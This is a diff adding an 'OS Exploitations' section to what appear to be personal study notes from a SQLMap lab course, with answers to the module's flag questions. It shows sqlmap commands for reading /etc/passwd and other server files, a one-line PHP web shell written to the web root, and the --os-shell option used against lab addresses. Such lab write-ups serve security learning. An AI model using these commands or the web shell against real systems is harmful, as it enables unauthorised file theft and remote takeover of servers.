@@ -299,7 +299,28 @@ Running `sqlmap -u "http://94.237.56.188:56678/case11.php?id=1" --dump --batch -
 
 ## OS Exploitations
 
+It is possible to get remote code execution using sql injection, if we have the correct priviliges. We can use sqlmap to test this using the --is-dba flag, if this returns true than we very likely have the priviliges we desire. 
 
+If we do have the priviliges we want, we can use the --file-read option in SQLMap to read files like:
+`sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`
+
+For writing files, it is much less likely because a compromised DB with write permissions can give remote code execution and lose the server. But it is still worth trying.
+
+We can use --file-write and --file-dest. First we will put a basic php script into shell.php.
+We can do something like `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
+
+Then we can try to write that file to the server `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`
+
+If we do verify that we can write files, sqlmap has a way to potentially write a shell without us needing to write any php files. We can use the --os-shell command for this.
+
+The questions in this section are: 
+Try to use SQLMap to read the file "/var/www/html/flag.txt".
+
+Running `sqlmap -u "http://83.136.253.251:52859/?id=1" --file-read "/var/www/html/flag.txt"` gets the answer
+
+Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host. 
+
+Running `sqlmap -u "http://83.136.253.251:52859/?id=1" --os-shell --technique=E` gets remote code execution, then we can run `ls ../../../` to find the flag, and `cat ../../../flag.txt` to get it
 
 # Skills Assessment
 
